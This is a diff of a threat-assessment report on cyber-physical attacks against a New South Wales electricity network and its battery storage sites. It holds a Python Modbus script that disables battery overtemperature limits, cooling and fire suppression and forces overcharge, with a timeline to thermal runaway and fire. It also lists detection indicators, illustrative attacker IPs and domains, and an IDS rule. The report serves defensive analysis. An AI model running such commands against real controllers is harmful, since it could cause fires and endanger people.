@@ -1,4 +1,4 @@
-## Cyber-Physical Attack Impact on NSW Electricity Network
+# Cyber-Physical Attack Impact on NSW Electricity Network
 
 
 Eigenia
@@ -466,46 +466,46 @@ The FrostyGoop malware (discovered by Dragos in April 2024, analyzed in EE-CTI-0
 An identical attack vector threatens ACME Inc. BESS infrastructure:
 
 ```python
-# FrostyGoop-style BESS thermal runaway attack (ANALYSIS ONLY)
-# Based on Eigenia-OTCE-EAB-009 technical analysis
+### FrostyGoop-style BESS thermal runaway attack (ANALYSIS ONLY)
+### Based on Eigenia-OTCE-EAB-009 technical analysis
 
 modbus_client = ModbusClient(target_ip="10.50.1.100", port=502)
 modbus_client.connect()
 
-# Phase 1: Disable overtemperature protection (Function Code 6)
+### Phase 1: Disable overtemperature protection (Function Code 6)
 modbus_client.write_register(
     address=0x1000,  # Cell temperature limit register
     value=0x00FF,    # 255°C (far exceeds safe limit of 60°C for lithium-ion)
     unit=1
 )
 
-# Phase 2: Force overcharge to exceed 4.5V/cell (Function Code 16)
+### Phase 2: Force overcharge to exceed 4.5V/cell (Function Code 16)
 modbus_client.write_multiple_registers(
     starting_address=0x2000,
     values=[0x46F5, 0x46F5, 0x46F5],  # 4.5V per cell (safe max: 3.65V)
     unit=1
 )
 
-# Phase 3: Disable cooling system (Function Code 5)
+### Phase 3: Disable cooling system (Function Code 5)
 modbus_client.write_coil(
     coil_address=0x0001,  # HVAC cooling enable
     value=False,           # Disable
     unit=1
 )
 
-# Phase 4: Disable fire suppression pre-arming (Function Code 5)
+### Phase 4: Disable fire suppression pre-arming (Function Code 5)
 modbus_client.write_coil(
     coil_address=0x0010,  # Fire suppression system enable
     value=False,           # Disable
     unit=1
 )
 
-# Timeline to thermal runaway:
-# T+15 minutes: Cells reach 120°C (SEI decomposition)
-# T+30 minutes: Cells reach 150°C (separator melting)
-# T+45 minutes: Thermal runaway initiated
-# T+60 minutes: Cell-to-cell propagation begins
-# T+2-4 hours: Full container fire
+### Timeline to thermal runaway:
+### T+15 minutes: Cells reach 120°C (SEI decomposition)
+### T+30 minutes: Cells reach 150°C (separator melting)
+### T+45 minutes: Thermal runaway initiated
+### T+60 minutes: Cell-to-cell propagation begins
+### T+2-4 hours: Full container fire
 ```
 
 ### 2.3.2 Multi-Site Thermal Cascade Scenario
@@ -3514,7 +3514,7 @@ After any P0 or P1 incident, ACME Inc. must conduct formal lessons learned revie
 **Suspicious API Traffic Patterns:**
 
 ```
-# Retailer API Abuse Indicators
+### Retailer API Abuse Indicators
 - Batch command size: >100 DER devices in single API call
 - Command frequency: >10 requests/minute from single retailer
 - Time-of-day anomaly: API calls between 02:00-05:00 local time
@@ -3525,7 +3525,7 @@ After any P0 or P1 incident, ACME Inc. must conduct formal lessons learned revie
 **ICCP Protocol Anomalies:**
 
 ```
-# ICCP Manipulation Indicators
+### ICCP Manipulation Indicators
 - Constraint data updates >1/minute (normal: 5-minute intervals)
 - Constraint values outside physical bounds (e.g., feeder capacity >150% rated)
 - ICCP session re-establishment >3 times/hour
@@ -3535,7 +3535,7 @@ After any P0 or P1 incident, ACME Inc. must conduct formal lessons learned revie
 **BESS Network Traffic:**
 
 ```
-# Lateral Movement in BESS Network
+### Lateral Movement in BESS Network
 - Modbus TCP connections between BESS units (should be isolated)
 - Modbus function code 0x10 (Write Multiple Registers) from non-DERMS source
 - SNMP Set commands to BESS units (should be read-only)
@@ -3557,13 +3557,13 @@ alert tcp any any -> $DERMS_API 443 (msg:"Potential Death Wobble - Rapid Charge/
 **DERMS Platform Compromise:**
 
 ```
-# Kubernetes Pod Indicators
+### Kubernetes Pod Indicators
 - Unexpected privilege escalation: hostPID, hostNetwork, privileged containers
 - Volume mount anomalies: /var/run/docker.sock, /etc/kubernetes, /proc
 - Process execution: /bin/bash, /bin/sh spawned in DERMS application pods
 - Network connections: Outbound connections to non-whitelisted IPs
 
-# File System Changes
+### File System Changes
 - /etc/shadow, /etc/passwd modifications
 - Cron job creation in DERMS pods
 - .ssh/authorized_keys additions
@@ -3573,7 +3573,7 @@ alert tcp any any -> $DERMS_API 443 (msg:"Potential Death Wobble - Rapid Charge/
 **BESS Controller Indicators:**
 
 ```
-# BMS Manipulation
+### BMS Manipulation
 - Firmware version rollback or unexpected update
 - Configuration file checksum mismatch
 - Thermal sensor reading spoofing (static values during charge/discharge)
@@ -3585,7 +3585,7 @@ alert tcp any any -> $DERMS_API 443 (msg:"Potential Death Wobble - Rapid Charge/
 **Grid Frequency Anomalies:**
 
 ```
-# Death Wobble Signature
+### Death Wobble Signature
 - Frequency oscillation: 0.5-2 Hz periodic variation
 - RoCoF sustained: >0.2 Hz/s for >30 seconds
 - BESS power synchronization: Multiple BESS units switching simultaneously
@@ -3595,7 +3595,7 @@ alert tcp any any -> $DERMS_API 443 (msg:"Potential Death Wobble - Rapid Charge/
 **SCADA Telemetry Anomalies:**
 
 ```
-# Process Data Indicators
+### Process Data Indicators
 - Feeder loading oscillation correlating with BESS dispatch
 - Voltage instability: >5% variation within 60-second window
 - Relay trip clustering: >3 protection relays within 10-minute window
@@ -3607,17 +3607,17 @@ alert tcp any any -> $DERMS_API 443 (msg:"Potential Death Wobble - Rapid Charge/
 **Known Malicious Infrastructure (Illustrative Examples):**
 
 ```
-# IP Addresses (update with current threat intel)
+### IP Addresses (update with current threat intel)
 - 203.0.113.0/24: VOLTZITE C2 infrastructure (2025-Q4)
 - 198.51.100.0/24: Sandworm staging servers (2024-Q2)
 - 192.0.2.0/24: FrostyGoop Modbus scanners (2025-Q1)
 
-# Domains
+### Domains
 - derms-update[.]com: Fake mPrest update server
 - ACME Inc.-vpn[.]net: Phishing domain impersonating EE VPN portal
 - scada-tools[.]org: Malicious OT tooling distribution
 
-# File Hashes (SHA256)
+### File Hashes (SHA256)
 - a3f5d... : Modbus exploit framework (FrostyGoop variant)
 - b7c2e... : ICCP protocol fuzzer (public tool, misuse indicator)
 - d9a1f... : DERMS credential harvester (VOLTZITE campaign)
